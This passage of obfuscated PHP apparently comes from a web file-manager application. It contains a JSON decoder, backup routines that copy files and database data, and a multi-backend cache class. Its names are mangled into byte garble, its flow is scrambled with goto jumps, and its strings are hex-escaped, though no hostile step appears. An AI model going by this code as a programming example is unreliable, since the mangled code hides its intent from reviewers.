$eĞí£¹Šš…[1947] || $Cæ†Ïğä™† == $eĞí£¹Šš…[67] && $c«¦ÖêºÆ != $eĞí£¹Šš…[1346]) { $d¯êåì‘ÒØ .= $C£×„…öò[++$c·¾Â¿šïà]; } break; case preg_match($eĞí£¹Šš…[1948], substr($C£×„…öò, $c·¾Â¿šïà, 6)): $A§„½ôâ— = chr(hexdec(substr($C£×„…öò, $c·¾Â¿šïà + 2, 2))) . chr(hexdec(substr($C£×„…öò, $c·¾Â¿šïà + 4, 2))); $d¯êåì‘ÒØ .= $this->utf162utf8($A§„½ôâ—); $c·¾Â¿šïà += 5; break; case $Då„¯ÚÂôµ >= 32 && $Då„¯ÚÂôµ <= 127: $d¯êåì‘ÒØ .= $C£×„…öò[$c·¾Â¿šïà]; break; case ($Då„¯ÚÂôµ & 224) == 192: $d¯êåì‘ÒØ .= substr($C£×„…öò, $c·¾Â¿šïà, 2); ++$c·¾Â¿šïà; break; case ($Då„¯ÚÂôµ & 240) == 224: $d¯êåì‘ÒØ .= substr($C£×„…öò, $c·¾Â¿šïà, 3); $c·¾Â¿šïà += 2; break; case ($Då„¯ÚÂôµ & 248) == 240: $d¯êåì‘ÒØ .= substr($C£×„…öò, $c·¾Â¿šïà, 4); $c·¾Â¿šïà += 3; break; case ($Då„¯ÚÂôµ & 252) == 248: $d¯êåì‘ÒØ .= substr($C£×„…öò, $c·¾Â¿šïà, 5); $c·¾Â¿šïà += 4; break; case ($Då„¯ÚÂôµ & 254) == 252: $d¯êåì‘ÒØ .= substr($C£×„…öò, $c·¾Â¿šïà, 6); $c·¾Â¿šïà += 5; break; } } return $d¯êåì‘ÒØ; } elseif (preg_match($eĞí£¹Šš…[1949], $c••—¨•Ò) || preg_match($eĞí£¹Šš…[1950], $c••—¨•Ò)) { goto cÙ›ÈÈ–Œ‘; dùÁÔºÂòÊ: for ($c·¾Â¿šïà = 0; $c·¾Â¿šïà <= $eùÒ½êÜË; ++$c·¾Â¿šïà) { $AØ“‡Ü¿Ü¢ = end($a„…Ã²Œ´Û); $c«¦ÖêºÆ = substr($C£×„…öò, $c·¾Â¿šïà, 2); if ($c·¾Â¿šïà == $eùÒ½êÜË || $C£×„…öò[$c·¾Â¿šïà] == $eĞí£¹Šš…[57] && $AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[1951]] == SERVICES_JSON_SLICE) { $dÇ’ø•Š = substr($C£×„…öò, $AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[274]], $c·¾Â¿šïà - $AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[274]]); array_push($a„…Ã²Œ´Û, array($eĞí£¹Šš…[1951] => SERVICES_JSON_SLICE, $eĞí£¹Šš…[274] => $c·¾Â¿šïà + 1, $eĞí£¹Šš…[1952] => !1)); if (reset($a„…Ã²Œ´Û) == SERVICES_JSON_IN_ARR) { array_push($DÃ¸ˆ¾ÆĞ¿, $this->decode($dÇ’ø•Š)); } elseif (reset($a„…Ã²Œ´Û) == SERVICES_JSON_IN_OBJ) { $EĞœÌ®ˆÙë = array(); if (preg_match($eĞí£¹Šš…[1953], $dÇ’ø•Š, $EĞœÌ®ˆÙë)) { $EÒáø¤‚®È = $this->decode($EĞœÌ®ˆÙë[1]); $e®†¾…¦… = $this->decode($EĞœÌ®ˆÙë[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $bé’åÛ´¨ø[$EÒáø¤‚®È] = $e®†¾…¦…; } else { $bé’åÛ´¨ø->{$EÒáø¤‚®È} = $e®†¾…¦…; } } elseif (preg_match($eĞí£¹Šš…[1954], $dÇ’ø•Š, $EĞœÌ®ˆÙë)) { $EÒáø¤‚®È = $EĞœÌ®ˆÙë[1]; $e®†¾…¦… = $this->decode($EĞœÌ®ˆÙë[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $bé’åÛ´¨ø[$EÒáø¤‚®È] = $e®†¾…¦…; } else { $bé’åÛ´¨ø->{$EÒáø¤‚®È} = $e®†¾…¦…; } } } } elseif (($C£×„…öò[$c·¾Â¿šïà] == $eĞí£¹Šš…[125] || $C£×„…öò[$c·¾Â¿šïà] == $eĞí£¹Šš…[67]) && $AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[1951]] != SERVICES_JSON_IN_STR) { array_push($a„…Ã²Œ´Û, array($eĞí£¹Šš…[1951] => SERVICES_JSON_IN_STR, $eĞí£¹Šš…[274] => $c·¾Â¿šïà, $eĞí£¹Šš…[1952] => $C£×„…öò[$c·¾Â¿šïà])); } elseif ($C£×„…öò[$c·¾Â¿šïà] == $AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[1952]] && $AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[1951]] == SERVICES_JSON_IN_STR && (strlen(substr($C£×„…öò, 0, $c·¾Â¿šïà)) - strlen(rtrim(substr($C£×„…öò, 0, $c·¾Â¿šïà), $eĞí£¹Šš…[105]))) % 2 != 1) { array_pop($a„…Ã²Œ´Û); } elseif ($C£×„…öò[$c·¾Â¿šïà] == $eĞí£¹Šš…[169] && in_array($AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[1951]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a„…Ã²Œ´Û, array($eĞí£¹Šš…[1951] => SERVICES_JSON_IN_ARR, $eĞí£¹Šš…[274] => $c·¾Â¿šïà, $eĞí£¹Šš…[1952] => !1)); } elseif ($C£×„…öò[$c·¾Â¿šïà] == $eĞí£¹Šš…[489] && $AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[1951]] == SERVICES_JSON_IN_ARR) { array_pop($a„…Ã²Œ´Û); } elseif ($C£×„…öò[$c·¾Â¿šïà] == $eĞí£¹Šš…[1059] && in_array($AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[1951]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a„…Ã²Œ´Û, array($eĞí£¹Šš…[1951] => SERVICES_JSON_IN_OBJ, $eĞí£¹Šš…[274] => $c·¾Â¿šïà, $eĞí£¹Šš…[1952] => !1)); } elseif ($C£×„…öò[$c·¾Â¿šïà] == $eĞí£¹Šš…[326] && $AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[1951]] == SERVICES_JSON_IN_OBJ) { array_pop($a„…Ã²Œ´Û); } elseif ($c«¦ÖêºÆ == $eĞí£¹Šš…[1955] && in_array($AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[1951]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a„…Ã²Œ´Û, array($eĞí£¹Šš…[1951] => SERVICES_JSON_IN_CMT, $eĞí£¹Šš…[274] => $c·¾Â¿šïà, $eĞí£¹Šš…[1952] => !1)); $c·¾Â¿šïà++; } elseif ($c«¦ÖêºÆ == $eĞí£¹Šš…[1956] && $AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[1951]] == SERVICES_JSON_IN_CMT) { array_pop($a„…Ã²Œ´Û); $c·¾Â¿šïà++; for ($E´ù¥·æÁ = $AØ“‡Ü¿Ü¢[$eĞí£¹Šš…[274]]; $E´ù¥·æÁ <= $c·¾Â¿šïà; ++$E´ù¥·æÁ) { $C£×„…öò = substr_replace($C£×„…öò, $eĞí£¹Šš…[60], $E´ù¥·æÁ, 1); } } } if (reset($a„…Ã²Œ´Û) == SERVICES_JSON_IN_ARR) { return $DÃ¸ˆ¾ÆĞ¿; } elseif (reset($a„…Ã²Œ´Û) == SERVICES_JSON_IN_OBJ) { return $bé’åÛ´¨ø; } goto AÔ¥ÃŒæ‰„; cÙ›ÈÈ–Œ‘: if ($c••—¨•Ò[0] == $eĞí£¹Šš…[169]) { $a„…Ã²Œ´Û = array(SERVICES_JSON_IN_ARR); $DÃ¸ˆ¾ÆĞ¿ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a„…Ã²Œ´Û = array(SERVICES_JSON_IN_OBJ); $bé’åÛ´¨ø = array(); } else { $a„…Ã²Œ´Û = array(SERVICES_JSON_IN_OBJ); $bé’åÛ´¨ø = new stdClass(); } } array_push($a„…Ã²Œ´Û, array($eĞí£¹Šš…[1951] => SERVICES_JSON_SLICE, $eĞí£¹Šš…[274] => 0, $eĞí£¹Šš…[1952] => !1)); $C£×„…öò = substr($c••—¨•Ò, 1, -1); goto AƒÜ÷ËÁô; AƒÜ÷ËÁô: $C£×„…öò = $this->reduce_string($C£×„…öò); if ($C£×„…öò == $eĞí£¹Šš…[43]) { if (reset($a„…Ã²Œ´Û) == SERVICES_JSON_IN_ARR) { return $DÃ¸ˆ¾ÆĞ¿; } else { return $bé’åÛ´¨ø; } } $eùÒ½êÜË = strlen($C£×„…öò); goto dùÁÔºÂòÊ; AÔ¥ÃŒæ‰„: } } } function isError($EİÎë®™¿‘, $CÏ°…©”«‹ = null) { $EÚ¨¢œÛ§à =& $_SERVER[¹÷ˆ§éÒ°ú]; if (class_exists($EÚ¨¢œÛ§à[1957])) { return PEAR::isError($EİÎë®™¿‘, $CÏ°…©”«‹); } elseif (is_object($EİÎë®™¿‘) && (get_class($EİÎë®™¿‘) == $EÚ¨¢œÛ§à[1958] || is_subclass_of($EİÎë®™¿‘, $EÚ¨¢œÛ§à[1958]))) { return !0; } return !1; } } if (class_exists($_SERVER[¹÷ˆ§éÒ°ú][1959])) { class Services_JSON_Error extends PEAR_Error { function __construct($BÒ´áÆ‡Ê“ = "\165\156\x6b\156\x6f\x77\156\40\145\x72\x72\x6f\x72", $B’†‚¯˜à‡ = null, $D¢ƒ÷ÑÖ¾ = null, $dÆ†ì«ö¥ = null, $e‘ßøœİÂÆ = null) { parent::PEAR_Error($BÒ´áÆ‡Ê“, $B’†‚¯˜à‡, $D¢ƒ÷ÑÖ¾, $dÆ†ì«ö¥, $e‘ßøœİÂÆ); } } } else { class Services_JSON_Error { function __construct($cŸäã´»Êõ = "\x75\x6e\153\156\157\x77\x6e\40\x65\x72\x72\x6f\162", $cç±Ë“ŸŸ  = null, $AÛ•µá¨“é = null, $DŒ…í‹§ä = null, $F¢ËÎéÜëÙ = null) { } } } goto eß•êÁíˆ; A“ï÷²×Ô: class BackupDbFile { public function __construct() { } public function index() { goto e¡…ôãÉ„ˆ; AÃ½…öàÄ: $cë°íó¡„· = new TaskFileTransfer($fôŞÎ’Šœ‰[723], $fôŞÎ’Šœ‰[708], 0, LNG($fôŞÎ’Šœ‰[709]) . $fôŞÎ’Šœ‰[423] . LNG($fôŞÎ’Šœ‰[711]) . $fôŞÎ’Šœ‰[724]); $cë°íó¡„·->addPath($cì×Ôá¯’Â); $d±î°¯©Œ = IO::infoWithChildren($cì×Ôá¯’Â); goto eêâ¾„âˆÌ; dƒÉ«ğ®¾: $c©§ “ğÕ = CONTROLLER_DIR . $fôŞÎ’Šœ‰[727]; IO::copy($cåšÔ¹ê, $a‘Â¿´®ß . "\x62\141\143\x6b\165\x70\137{$E«¤§—¨Å}\x2f"); IO::copy($c©§ “ğÕ, $a‘Â¿´®ß . "\x62\141\x63\x6b\165\x70\137{$E«¤§—¨Å}\57"); goto Fë‰´˜Ñë•; eêâ¾„âˆÌ: Backup::set(array($fôŞÎ’Šœ‰[725] => $d±î°¯©Œ[$fôŞÎ’Šœ‰[89]])); IO::move($cì×Ôá¯’Â, $a‘Â¿´®ß); $cåšÔ¹ê = CONTROLLER_DIR . $fôŞÎ’Šœ‰[726]; goto dƒÉ«ğ®¾; e¡…ôãÉ„ˆ: $fôŞÎ’Šœ‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÏƒÛÑÜœò = Backup::get(); $E«¤§—¨Å = $DÏƒÛÑÜœò[$fôŞÎ’Šœ‰[38]]; goto d…“‚ôå‚˜; d…“‚ôå‚˜: $cì×Ôá¯’Â = TEMP_FILES . "\142\141\x63\x6b\165\x70\x5f{$E«¤§—¨Å}\57"; $a‘Â¿´®ß = "\173\x69\x6f\x3a{$DÏƒÛÑÜœò[$fôŞÎ’Šœ‰[686]]}\175\x2f\144\141\x74\141\142\141\x73\x65\57"; IO::mkdir($a‘Â¿´®ß . "\x62\141\x63\153\x75\160\137{$E«¤§—¨Å}\x2f"); goto AÃ½…öàÄ; Fë‰´˜Ñë•: $cë°íó¡„·->end(); Backup::set(array($fôŞÎ’Šœ‰[728] => $d±î°¯©Œ[$fôŞÎ’Šœ‰[89]])); return !0; goto AšÙÈ÷•µ¸; AšÙÈ÷•µ¸: } } class BackupFile { public function __construct() { } public function index() { goto Cğ‘†å–ŞŸ; fÊÂÎ«Ç…: $c­˜˜Ğ¶Õ = !0; $DŞÊ¯›ä˜ = $this->storeIds(); $fğ£‡±Äƒ = 1; goto e£Íš’ô; fÒ¸ÔÛ¨±‚: $f…ªÛƒÓĞß = (int) Model($_SERVER[¹÷ˆ§éÒ°ú][713])->where($D¸ôîˆ÷†)->count($_SERVER[¹÷ˆ§éÒ°ú][430]); $DÙÏİ›ƒ„¨ = (int) Model($_SERVER[¹÷ˆ§éÒ°ú][713])->where($D¸ôîˆ÷†)->sum($_SERVER[¹÷ˆ§éÒ°ú][89]); $c³öˆá£éÏ = new TaskFileTransfer($_SERVER[¹÷ˆ§éÒ°ú][731], $_SERVER[¹÷ˆ§éÒ°ú][708], $f…ªÛƒÓĞß, LNG($_SERVER[¹÷ˆ§éÒ°ú][709]) . $_SERVER[¹÷ˆ§éÒ°ú][710] . LNG($_SERVER[¹÷ˆ§éÒ°ú][732])); goto D÷¾†äóœ; e£Íš’ô: $C›‰ŸÛÆáì = 1000; $E¼ïÈ‡¨¢³ = $AĞÇóŞ¥ø = 0; $e„‚ÄÓ†ã = array(); goto eÜ—ø¤öè; F“‰ÌîÂº: $dï™º¸¦ƒ = $c­˜˜Ğ¶Õ ? 1 : 0; $b÷‰ˆŠŒ“¦ = array($_SERVER[¹÷ˆ§éÒ°ú][745] => 1, $_SERVER[¹÷ˆ§éÒ°ú][460] => time(), $_SERVER[¹÷ˆ§éÒ°ú][703] => $dï™º¸¦ƒ, $_SERVER[¹÷ˆ§éÒ°ú][742] => $BÚÛÔÅÌ·Ö, $_SERVER[¹÷ˆ§éÒ°ú][734] => $DÙÏİ›ƒ„¨, $_SERVER[¹÷ˆ§éÒ°ú][733] => $f…ªÛƒÓĞß); if ($AĞÇóŞ¥ø) { $b÷‰ˆŠŒ“¦[$_SERVER[¹÷ˆ§éÒ°ú][743]] = $e¤©ÉóÃÕ; $b÷‰ˆŠŒ“¦[$_SERVER[¹÷ˆ§éÒ°ú][744]] = $D¥’†—×ß; } goto bë‚†ç„ª; D÷¾†äóœ: $c³öˆá£éÏ->task[$_SERVER[¹÷ˆ§éÒ°ú][693]] = $DÙÏİ›ƒ„¨; $b÷‰ˆŠŒ“¦ = array($_SERVER[¹÷ˆ§éÒ°ú][733] => $f…ªÛƒÓĞß, $_SERVER[¹÷ˆ§éÒ°ú][734] => $DÙÏİ›ƒ„¨); Backup::set($b÷‰ˆŠŒ“¦); goto fÊÂÎ«Ç…; bë‚†ç„ª: Backup::set($b÷‰ˆŠŒ“¦); $this->_fileFilter($e„‚ÄÓ†ã); return !0; goto eõ¡§‡˜¡˜; Cğ‘†å–ŞŸ: $e‚ô‡¬Ä®° = Backup::get(); $BÚÛÔÅÌ·Ö = $e‚ô‡¬Ä®°[$_SERVER[¹÷ˆ§éÒ°ú][292]][$_SERVER[¹÷ˆ§éÒ°ú][179]][$_SERVER[¹÷ˆ§éÒ°ú][430]]; $D¸ôîˆ÷† = array($_SERVER[¹÷ˆ§éÒ°ú][431] => array($_SERVER[¹÷ˆ§éÒ°ú][729], $BÚÛÔÅÌ·Ö), $_SERVER[¹÷ˆ§éÒ°ú][730] => array($_SERVER[¹÷ˆ§éÒ°ú][330], $e‚ô‡¬Ä®°[$_SERVER[¹÷ˆ§éÒ°ú][686]])); goto fÒ¸ÔÛ¨±‚; eÜ—ø¤öè: $D¥’†—×ß = $e¤©ÉóÃÕ = 0; do { $c÷Ş•ÖÇ÷è = $_SERVER[¹÷ˆ§éÒ°ú][735]; $Cñª×´ñ¬’ = Model($_SERVER[¹÷ˆ§éÒ°ú][713])->where($D¸ôîˆ÷†)->field($c÷Ş•ÖÇ÷è)->order($_SERVER[¹÷ˆ§éÒ°ú][736])->selectPage($C›‰ŸÛÆáì, $fğ£‡±Äƒ); $D×ÖæÉÄß™ = !empty($Cñª×´ñ¬’[$_SERVER[¹÷ˆ§éÒ°ú][365]]) ? $Cñª×´ñ¬’[$_SERVER[¹÷ˆ§éÒ°ú][365]] : array(); foreach ($D×ÖæÉÄß™ as $cÈ…Ö’£ßã) { goto Cœ®“ŒïÄ; Cœ®“ŒïÄ: if (!$this->_fileExist($cÈ…Ö’£ßã, $e„‚ÄÓ†ã, $DŞÊ¯›ä˜)) { $f…ªÛƒÓĞß -= 1; $DÙÏİ›ƒ„¨ -= (int) $cÈ…Ö’£ßã[$_SERVER[¹÷ˆ§éÒ°ú][89]]; write_log("\x66\x69\x6c\145\x20\156\157\x74\40\145\170\x69\163\164\x2e\x66\151\154\x65\111\x44\x3a{$cÈ…Ö’£ßã[$_SERVER[¹÷ˆ§éÒ°ú][430]]}\54\40\160\141\x74\150\x3a{$cÈ…Ö’£ßã[$_SERVER[¹÷ˆ§éÒ°ú][87]]}", $_SERVER[¹÷ˆ§éÒ°ú][737]); continue; } $dœÒéÅ‘ªÅ = $cÈ…Ö’£ßã[$_SERVER[¹÷ˆ§éÒ°ú][87]]; $d”âõ¸ñÉÁ = "\173\151\157\72{$e‚ô‡¬Ä®°[$_SERVER[¹÷ˆ§éÒ°ú][686]]}\x7d" . substr($dœÒéÅ‘ªÅ, strlen("\173\x69\157\72{$cÈ…Ö’£ßã[$_SERVER[¹÷ˆ§éÒ°ú][738]]}\x7d")); goto E×ÊÊÒŠ÷; E×ÊÊÒŠ÷: if (IO::exist($d”âõ¸ñÉÁ)) { $c³öˆá£éÏ->updateFileEnd($cÈ…Ö’£ßã[$_SERVER[¹÷ˆ§éÒ°ú][38]], $cÈ…Ö’£ßã[$_SERVER[¹÷ˆ§éÒ°ú][89]]); } else { $d”âõ¸ñÉÁ = get_path_father($d”âõ¸ñÉÁ); IO::mkdir($d”âõ¸ñÉÁ); if (!IO::copy($dœÒéÅ‘ªÅ, $d”âõ¸ñÉÁ, $_SERVER[¹÷ˆ§éÒ°ú][739])) { write_log($_SERVER[¹÷ˆ§éÒ°ú][740] . $dœÒéÅ‘ªÅ . $_SERVER[¹÷ˆ§éÒ°ú][741] . $d”âõ¸ñÉÁ . $_SERVER[¹÷ˆ§éÒ°ú][489], $_SERVER[¹÷ˆ§éÒ°ú][708]); $c­˜˜Ğ¶Õ = !1; break; } } $BÚÛÔÅÌ·Ö = $cÈ…Ö’£ßã[$_SERVER[¹÷ˆ§éÒ°ú][430]]; $AĞÇóŞ¥ø += 1; goto f³¬™Ş¨Í‘; f³¬™Ş¨Í‘: $E¼ïÈ‡¨¢³ += $cÈ…Ö’£ßã[$_SERVER[¹÷ˆ§éÒ°ú][89]]; $e¤©ÉóÃÕ += 1; $D¥’†—×ß += $cÈ…Ö’£ßã[$_SERVER[¹÷ˆ§éÒ°ú][89]]; goto eí©÷…¨Ô©; eí©÷…¨Ô©: if ($E¼ïÈ‡¨¢³ >= 1024 * 1024 * 100) { $b÷‰ˆŠŒ“¦ = array($_SERVER[¹÷ˆ§éÒ°ú][742] => $BÚÛÔÅÌ·Ö, $_SERVER[¹÷ˆ§éÒ°ú][743] => $e¤©ÉóÃÕ, $_SERVER[¹÷ˆ§éÒ°ú][744] => $D¥’†—×ß); Backup::set($b÷‰ˆŠŒ“¦); $E¼ïÈ‡¨¢³ = $AĞÇóŞ¥ø = 0; } goto E’ÊÁøÕ¥Ö; E’ÊÁøÕ¥Ö: } $BÖ‘‰„ºŒ“ = count($D×ÖæÉÄß™); $fğ£‡±Äƒ++; } while ($BÖ‘‰„ºŒ“ == $C›‰ŸÛÆáì); $c³öˆá£éÏ->end(); goto F“‰ÌîÂº; eõ¡§‡˜¡˜: } private function _fileExist($dğ—ÈÃêãÏ, &$d›”ÛˆÖÎª, $dÚŞ½·œÑİ) { goto d‰œó‹¤”; d‰œó‹¤”: $b™é‡ÜÊ® =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÑ„ôÍç–« = $dğ—ÈÃêãÏ[$b™é‡ÜÊ®[87]]; if (in_array($dğ—ÈÃêãÏ[$b™é‡ÜÊ®[430]], $d›”ÛˆÖÎª)) { return !1; } goto d”Ÿ£Í†“; e½¡¸Ê·˜‚: if (IO::exist($CÒÜñÒÀÅ)) { $d›”ÛˆÖÎª[] = $dğ—ÈÃêãÏ[$b™é‡ÜÊ®[430]]; return !1; } $a²³„§¥í¶ = array($b™é‡ÜÊ®[738] => $dğ—ÈÃêãÏ[$b™é‡ÜÊ®[738]], $b™é‡ÜÊ®[87] => array($b™é‡ÜÊ®[746], "{$CÒÜñÒÀÅ}\x25")); $a‡±è¸¹² = Model($b™é‡ÜÊ®[713])->where($a²³„§¥í¶)->field($b™é‡ÜÊ®[431])->select(); goto DòÜ›‹å; d”Ÿ£Í†“: if (!in_array($dğ—ÈÃêãÏ[$b™é‡ÜÊ®[738]], $dÚŞ½·œÑİ)) { return !1; } if (IO::exist($AÑ„ôÍç–«)) { return !0; } $CÒÜñÒÀÅ = get_path_father($AÑ„ôÍç–«); goto e½¡¸Ê·˜‚; DòÜ›‹å: $d›”ÛˆÖÎª = array_merge($d›”ÛˆÖÎª, array_to_keyvalue($a‡±è¸¹², $b™é‡ÜÊ®[43], $b™é‡ÜÊ®[430])); return !1; goto C¢Ö¢Ê›¹Ô; C¢Ö¢Ê›¹Ô: } private function _fileFilter($a©—«ÈŞÚ¤) { $EÅõÍß”¡é =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($a©—«ÈŞÚ¤)) { return; } $dÊùÎ‹ = array($EÅõÍß”¡é[430] => array($EÅõÍß”¡é[17], array_unique($a©—«ÈŞÚ¤))); $e³Šùåß¦ñ = Model($EÅõÍß”¡é[747])->where($dÊùÎ‹)->field($EÅõÍß”¡é[380])->select(); foreach ($e³Šùåß¦ñ as $Bçë¡»ó¯¶) { Model($EÅõÍß”¡é[747])->remove($Bçë¡»ó¯¶[$EÅõÍß”¡é[380]], !1); } } private function storeIds() { $d›ŒÜÏÙ¿š =& $_SERVER[¹÷ˆ§éÒ°ú]; $C¨ùÒŒ°†¢ = Model($d›ŒÜÏÙ¿š[698])->listData(); $FÎö‚÷í = array(); $cÑ”÷˜ÁÃÎ = $GLOBALS[$d›ŒÜÏÙ¿š[16]][$d›ŒÜÏÙ¿š[96]][$d›ŒÜÏÙ¿š[748]]; foreach ($C¨ùÒŒ°†¢ as $cĞ·¼«¹ •) { $A·ôÔ…°²” = strtolower($cĞ·¼«¹ •[$d›ŒÜÏÙ¿š[102]]); if (!isset($cÑ”÷˜ÁÃÎ[$A·ôÔ…°²”])) { continue; } $fÕ¥íšÜÇ× = $d›ŒÜÏÙ¿š[83] . (isset($cÑ”÷˜ÁÃÎ[$A·ôÔ…°²”]) ? $cÑ”÷˜ÁÃÎ[$A·ôÔ…°²”] : ucfirst($A·ôÔ…°²”)); if (!class_exists($fÕ¥íšÜÇ×)) { continue; } $FÎö‚÷í[] = $cĞ·¼«¹ •[$d›ŒÜÏÙ¿š[378]]; } return $FÎö‚÷í; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto EÑæ×ã©Œ; AÁ‚•Úº¹å: switch ($a×áÇ÷ÓØŞ[$C’§ø«¨èÊ[749]]) { case $C’§ø«¨èÊ[27]: self::$handle = Model($C’§ø«¨èÊ[751]); break; case $C’§ø«¨èÊ[752]: self::$handle = new CacheRedis($Fùó¡±éç¿, $D›°¨‹ëŒù); break; case $C’§ø«¨èÊ[753]: self::$handle = new CacheMemcached($Fùó¡±éç¿, $D›°¨‹ëŒù); break; case $C’§ø«¨èÊ[179]: self::$handle = new CacheFile($Fùó¡±éç¿, $D›°¨‹ëŒù); break; default: break; } return self::$handle; goto bé ƒòó™; EÑæ×ã©Œ: $C’§ø«¨èÊ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto b÷„ƒáæĞî; b÷„ƒáæĞî: $a×áÇ÷ÓØŞ = $GLOBALS[$C’§ø«¨èÊ[16]][$C’§ø«¨èÊ[348]]; $Fùó¡±éç¿ = $a×áÇ÷ÓØŞ[$a×áÇ÷ÓØŞ[$C’§ø«¨èÊ[749]]]; $D›°¨‹ëŒù = $a×áÇ÷ÓØŞ[$C’§ø«¨èÊ[750]]; goto AÁ‚•Úº¹å; bé ƒòó™: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($cËß…Ì¯¢µ) { if (is_array($cËß…Ì¯¢µ) || is_object($cËß…Ì¯¢µ)) { $cËß…Ì¯¢µ = json_encode($cËß…Ì¯¢µ); } $cËß…Ì¯¢µ = rawurlencode($cËß…Ì¯¢µ); return KOD_SITE_ID . $_SERVER[¹÷ˆ§éÒ°ú][82] . $cËß…Ì¯¢µ; } public static function get($EÂÓƒ¹–‘) { $EÄåÄ¦ÓÑ‚ = self::key($EÂÓƒ¹–‘); if (!isset(self::$memoryCache[$EÄåÄ¦ÓÑ‚])) { $E¾óƒ—„ï = self::init()->get($EÄåÄ¦ÓÑ‚); self::$memoryCache[$EÄåÄ¦ÓÑ‚] = unserialize($E¾óƒ—„ï); } return self::$memoryCache[$EÄåÄ¦ÓÑ‚]; } public static function set($e‘†øŞ«ëˆ, $a£ùÈÎ¬æ¹, $a³Åö§Åí = false) { goto e½å™ŞŸï; E»ÅÎ­ô: CacheLock::lock($e‘†øŞ«ëˆ); $BÉ«’ÒÓæ¤ = self::init()->set($D¿È”õ§„±, serialize($a£ùÈÎ¬æ¹), $a³Åö§Åí); self::$memoryCache[$D¿È”õ§„±] = $a£ùÈÎ¬æ¹; goto D°ÅÅ’Ğ±å; e½å™ŞŸï: $D¿È”õ§„± = self::key($e‘†øŞ«ëˆ); if (isset(self::$memoryCache[$D¿È”õ§„±]) && self::$memoryCache[$D¿È”õ§„±] === $a£ùÈÎ¬æ¹) { return !0; } if ($a³Åö§Åí === 0) { self::$memoryCache[$D¿È”õ§„±] = $a£ùÈÎ¬æ¹; return !0; } goto E»ÅÎ­ô; D°ÅÅ’Ğ±å: CacheLock::unlock($e‘†øŞ«ëˆ); return $BÉ«’ÒÓæ¤; goto A…¶½Í—ˆà; A…¶½Í—ˆà: } public static function remove($aôÀÂ×·­¤) { goto C±¾ø³Ä†Æ; C±¾ø³Ä†Æ: $f›·÷´¯Àİ = self::key($aôÀÂ×·­¤); unset(self::$memoryCache[$f›·÷´¯Àİ]); self::clearTimeout(); goto bääƒ„À…Õ; Dæ¼ÍĞ…: return $a²ëÛïâ”â; goto F’áÍº”Œá; bääƒ„À…Õ: CacheLock::lock($aôÀÂ×·­¤); $a²ëÛïâ”â = self::init()->remove($f›·÷´¯Àİ); CacheLock::unlock($aôÀÂ×·­¤); goto Dæ¼ÍĞ…; F’áÍº”Œá: } public static function clearMemory($b¼‚Üø„ô = false) { if ($b¼‚Üø„ô) { $b¼‚Üø„ô = self::key($b¼‚Üø„ô); unset(self::$memoryCache[$b¼‚Üø„ô]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¹÷ˆ§éÒ°ú][754])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¹÷ˆ§éÒ°ú][755])) { self::init()->clearTimeout(); } } } goto dÃ°ù—ÌƒÛ; eô•­¡½åŒ: define($_SERVER[¹÷ˆ§éÒ°ú][240], 1); define($_SERVER[¹÷ˆ§éÒ°ú][241], 0); define($_SERVER[¹÷ˆ§éÒ°ú][242], 2); goto eç¸íÃÅÂˆ; Aò¥é»ÂÕ‚: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($B‰¸¿éµ) { $b…Ä‚¼µÄ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c­–ŞÆ®ÕÊ = Model($b…Ä‚¼µÄ[487])->where(array($b…Ä‚¼µÄ[1418] => $B‰¸¿éµ))->find(); $D®•Ğµ¡å¯ = $this->_mkdirRoot(SourceModel::TYPE_USER, $B‰¸¿éµ, $c­–ŞÆ®ÕÊ[$b…Ä‚¼µÄ[38]]); $this->userDesktopAdd($D®•Ğµ¡å¯); return $D®•Ğµ¡å¯; } public function userDesktopAdd($F«©šÆ–) { $b‰¼äÇ°”„ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Aˆ¦Ùã¹»Ä = LNG($b‰¼äÇ°”„[2339]); $C´¥³¢ÇêÔ = $this->mkdir($F«©šÆ–, $Aˆ¦Ùã¹»Ä); $this->metaSet($C´¥³¢ÇêÔ, $b‰¼äÇ°”„[2340], $b‰¼äÇ°”„[95]); $this->metaSet($F«©šÆ–, $b‰¼äÇ°”„[2341], $C´¥³¢ÇêÔ); } public function groupRootAdd($DÛ›Œù´„´) { $dƒ¬ËŠ¶±Á =& $_SERVER[¹÷ˆ§éÒ°ú]; $dôÜÂ…£íø = Model($dƒ¬ËŠ¶±Á[471])->where(array($dƒ¬ËŠ¶±Á[2175] => $DÛ›Œù´„´))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $DÛ›Œù´„´, $dôÜÂ…£íø[$dƒ¬ËŠ¶±Á[38]]); } public function systemRootPathAdd($dƒÛö‘«õ÷) { if ($dƒÛö‘«õ÷ != $_SERVER[¹÷ˆ§éÒ°ú][1080]) { return !1; } 